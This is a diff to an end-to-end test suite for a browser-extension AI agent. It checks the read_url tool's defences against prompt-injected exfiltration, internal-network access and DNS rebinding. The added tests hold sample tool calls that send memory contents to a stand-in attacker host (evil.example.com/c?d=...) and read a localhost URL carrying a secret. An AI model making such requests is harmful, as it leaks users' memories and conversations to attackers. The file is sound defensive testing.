@@ -147,13 +147,14 @@ const ATTACK = `http://127.0.0.1:${ATTACK_PORT}`;
 // 不用 ctx.route：擴充功能用 chrome.tabs.create 開的背景分頁，第一個請求 playwright 攔不到（會真的連出去）
 const WEB_PORT = 9395;
 const WEB_HOSTS = ["www.google.test", "docs.example.org", "blog.example.net", "ref.example.org", "evil.example.com"];
+const REBIND_HOST = "rebind.example.com"; // 公開網域、DNS 卻指到本機（[::1]）：測試版只把 127.0.0.1 當公開 IP
 const SERP = (q) => `<!doctype html><meta charset=utf-8><title>${q} - Google</title><div id=rso>
   <div class=g><a href="http://docs.example.org/a"><h3>React 狀態管理比較</h3></a><cite>http://docs.example.org › a</cite><div>Zustand、Jotai 與 Redux Toolkit 在 2026 年的下載量與活躍度比較整理。</div></div>
   <div class=g><a href="/url?q=http://blog.example.net/b&amp;sa=U"><h3>我們為什麼換掉 Redux</h3></a><div>團隊從 Redux 換到 Zustand 之後，樣板程式碼少了一半的經驗分享。</div></div>
   <div class=g><a href="http://www.google.test/search?q=related"><h3>相關搜尋</h3></a></div></div>`;
 const ARTICLE = (title, body, links = "") => `<!doctype html><meta charset=utf-8><title>${title}</title><nav><a href="http://docs.example.org/nav">導覽連結</a></nav><article><h1>${title}</h1><p>${body}</p>${links}</article>`;
 const web = { reqs: [], googleBlocked: false, parallelSeen: null, blogArrived: () => {}, blogHere: null }; // reqs：GET 的完整網址
-const webSrv = http.createServer(async (q, r) => {
+const webHandler = async (q, r) => {
   const url = `http://${q.headers.host}${q.url}`;
   const html = (h) => { r.setHeader("content-type", "text/html; charset=utf-8"); r.end(h); };
   if (q.method !== "GET") return html(""); // isPdfUrl 的 HEAD
@@ -170,8 +171,13 @@ const webSrv = http.createServer(async (q, r) => {
   }
   if (url === "http://blog.example.net/b") { web.blogArrived(); return html(ARTICLE("我們為什麼換掉 Redux", "換到 Zustand 之後樣板少了一半。")); }
   return html(ARTICLE("其他頁面", "這是另一個頁面的內容，用來測試讀取。"));
-}).listen(WEB_PORT, "127.0.0.1");
-await new Promise((r, j) => { webSrv.once("listening", r); webSrv.once("error", j); });
+};
+// 兩台都先掛好 listening／error 再一起等：一台一台 await 的話，第二台的 listening 可能在掛上之前就發生了，永遠等不到
+const listening = (sv) => new Promise((r, j) => { sv.once("listening", r); sv.once("error", j); });
+const webSrv = http.createServer(webHandler), webSrv6 = http.createServer(webHandler);
+const webReady = Promise.all([listening(webSrv), listening(webSrv6)]);
+webSrv.listen(WEB_PORT, "127.0.0.1"); webSrv6.listen(WEB_PORT, "::1");
+await webReady;
 
 const sse = (blocks, stop, usage = { input_tokens: 1, output_tokens: 1 }) => {
   const ev = (type, data) => `event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`;
@@ -210,7 +216,7 @@ let mode = "script", loopCalls = 0, lastToolChoice = null;
 
 const dir = fs.mkdtempSync(path.join(os.tmpdir(), "ba-e2e-"));
 // 介面語言固定繁中：下面的斷言用中文文字（預設技能名稱、用量列）；首次載入就會依瀏覽器語言建立預設技能
-const ctx = await chromium.launchPersistentContext(dir, { channel: "chromium", headless: !process.env.HEADED, locale: "zh-TW", args: ["--lang=zh-TW", `--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`, `--host-resolver-rules=${WEB_HOSTS.map((h) => `MAP ${h} 127.0.0.1:${WEB_PORT}`).join(", ")}`] });
+const ctx = await chromium.launchPersistentContext(dir, { channel: "chromium", headless: !process.env.HEADED, locale: "zh-TW", args: ["--lang=zh-TW", `--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`, `--host-resolver-rules=${[...WEB_HOSTS.map((h) => `MAP ${h} 127.0.0.1:${WEB_PORT}`), `MAP ${REBIND_HOST} [::1]:${WEB_PORT}`].join(", ")}`] });
 try {
   let [sw] = ctx.serviceWorkers(); if (!sw) sw = await ctx.waitForEvent("serviceworker");
   const id = new URL(sw.url()).host;
@@ -1181,7 +1187,9 @@ try {
     { type: "tool_use", id: "r5", name: "read_url", input: { url: "http://evil.example.com/forged" } }, // 只出現在整理後的文字裡（網頁可以操弄）：要問
     { type: "text", text: "推薦 Zustand [1][3]，社群經驗見 [2]；[99] 不存在。" },
   ]);
-  await until(() => waitingCard().count(), "read_url 自己組的網址：確認卡沒出現");
+  // 搜尋＋兩頁並行＋一頁＋各自整理：機器忙的時候超過 10 秒，給 30 秒；等不到就把目前的工具結果印出來
+  await until(() => waitingCard().count(), "read_url 自己組的網址：確認卡沒出現", 120)
+    .catch((e) => { console.log("research so far:", JSON.stringify(reqs.slice(1).map((_, i) => resultsOf(i + 1))), web.reqs, haikuReqs.length); throw e; });
   assert.equal(await waitingCard().locator(".confirm-detail").textContent(), "http://evil.example.com/forged", "卡片顯示完整網址");
   await waitingCard().locator(".confirm-deny").click();
   await idle();
@@ -1247,6 +1255,35 @@ try {
   assert.ok((await activeUrls()).includes(`http://127.0.0.1:${PORT}/`), "切回任務的分頁");
   await until(() => bgTabs() === 0, "驗證完的搜尋分頁沒有關掉");
   web.googleBlocked = false;
+
+  // read_url 的網址規則（推翻式審查抓到的外洩路徑）：使用者提到的網站只認完全相同的網址，不是整個網站——
+  // 網頁可以叫模型讀「同一個網站」的 /c?d=<記憶與對話>，背景分頁看不到、也沒有確認卡
+  web.reqs.length = 0;
+  await run("研究 evil.example.com 這個網站", [
+    { type: "tool_use", id: "e1", name: "read_url", input: { url: "http://evil.example.com/" } },
+    { type: "tool_use", id: "e2", name: "read_url", input: { url: "http://evil.example.com/c?d=記憶內容" } },
+  ]);
+  await until(() => waitingCard().count(), "使用者提到的網站、自己組的路徑：確認卡沒出現");
+  assert.equal(await waitingCard().locator(".confirm-detail").textContent(), "http://evil.example.com/c?d=記憶內容", "卡片顯示完整網址");
+  await waitingCard().locator(".confirm-deny").click();
+  await idle();
+  assert.match(resultsOf(1)[0], /^\[1\] 其他頁面\nhttp:\/\/evil\.example\.com\//, "使用者給的網址本身直接讀");
+  assert.deepEqual(web.reqs, ["http://evil.example.com/"], "拒絕 → 帶資料的網址 0 請求");
+  // 開始時的分頁（這裡是 127.0.0.1 的測試頁）也不算：而且是內網，一律不讀
+  await run("摘要這頁", [{ type: "tool_use", id: "e3", name: "read_url", input: { url: `http://127.0.0.1:${PORT}/?d=secret` } }]);
+  await idle();
+  assert.match(lastResult(), /^ERR:不能讀本機或內網的網址/);
+  assert.equal(await cc.count(), 0, "內網直接擋，不跳卡");
+  // 公開網域、DNS 卻指到本機（rebinding）：就算使用者按了允許，內容也不交給模型
+  web.reqs.length = 0;
+  await run("研究", [{ type: "tool_use", id: "e4", name: "read_url", input: { url: `http://${REBIND_HOST}/admin` } }]);
+  await until(() => waitingCard().count(), "rebind：確認卡沒出現");
+  await waitingCard().locator(".confirm-allow").click();
+  await idle();
+  assert.match(lastResult(), /^ERR:這個網址被轉到本機、內網/, "實際連到的 IP 是本機 → 不讀");
+  assert.deepEqual(web.reqs, [`http://${REBIND_HOST}/admin`], "（請求本身已經發出，跟一般網頁能做的一樣；擋的是把內容讀回來）");
+  await until(() => bgTabs() === 0, "rebind 的背景分頁沒有關掉");
+
   await ctx.unroute(`${BACKEND}/v1/messages**`, researchRoute);
 
   // 輸入框下方的模型與思考深度選單（Anthropic）：在畫面底部，往上開
@@ -1815,4 +1852,4 @@ try {
   }
 
   console.log("E2E: all checks passed");
-} finally { await ctx.close(); server.close(); backendSrv.close(); mock.close(); attacker.close(); webSrv.close(); fs.rmSync(dir, { recursive: true, force: true }); }
+} finally { await ctx.close(); server.close(); backendSrv.close(); mock.close(); attacker.close(); webSrv.close(); webSrv6.close(); fs.rmSync(dir, { recursive: true, force: true }); }
